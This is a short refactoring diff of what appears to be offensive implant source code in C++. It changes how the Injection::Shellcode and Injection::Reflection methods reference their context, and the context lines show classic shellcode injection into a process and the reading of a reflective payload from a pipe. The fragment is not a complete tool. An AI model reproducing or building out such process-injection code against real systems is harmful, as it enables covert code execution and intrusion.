@@ -8,7 +8,7 @@ auto DECLFN Injection::Shellcode(
 ) -> BOOL {
     BOOL  Success = FALSE;
 
-    switch ( Self->Inj->Ctx.Sc.TechniqueID ) {
+    switch ( this->Ctx.Sc.TechniqueID ) {
         case ScClassic: {
             PVOID  ScBase   = NULL;
             ULONG  TdID     = 0;
@@ -16,7 +16,7 @@ auto DECLFN Injection::Shellcode(
 
             KhDbg("dbg");
 
-            Success = Self->Inj->Classic( 
+            Success = this->Classic( 
                 ProcessID, Buffer, Size, Param, &ScBase
             );
 
@@ -206,8 +206,8 @@ auto DECLFN Injection::Reflection(
 
     KhDbg( "reading bytes..." );
 
-    Self->Inj->Ctx.Pipe.p = Self->Hp->Alloc( PIPE_BUFFER_LENGTH );
-    Self->Krnl32.ReadFile( PipeRead, Self->Inj->Ctx.Pipe.p, PIPE_BUFFER_LENGTH, Reads, 0 );
+    this->Ctx.Pipe.p = Self->Hp->Alloc( PIPE_BUFFER_LENGTH );
+    Self->Krnl32.ReadFile( PipeRead, this->Ctx.Pipe.p, PIPE_BUFFER_LENGTH, Reads, 0 );
 
 _KH_END:
     if ( ImgBase ) {
